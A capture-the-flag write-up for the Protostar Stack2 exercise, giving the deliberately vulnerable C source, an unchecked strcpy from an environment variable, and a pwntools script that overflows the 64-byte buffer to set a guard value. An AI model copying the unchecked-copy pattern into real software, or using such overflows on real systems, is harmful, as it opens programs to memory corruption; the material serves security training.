## Challenge Description

Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

## Solution

```python
from pwn import *

env_value = b"A"*64 + p32(0x0d0a0d0a)

target = process("./stack2", env={'GREENIE':env_value})
elf = context.binary = ELF("./stack2", checksec = False)
context.log_level = "debug"

target.interactive()
```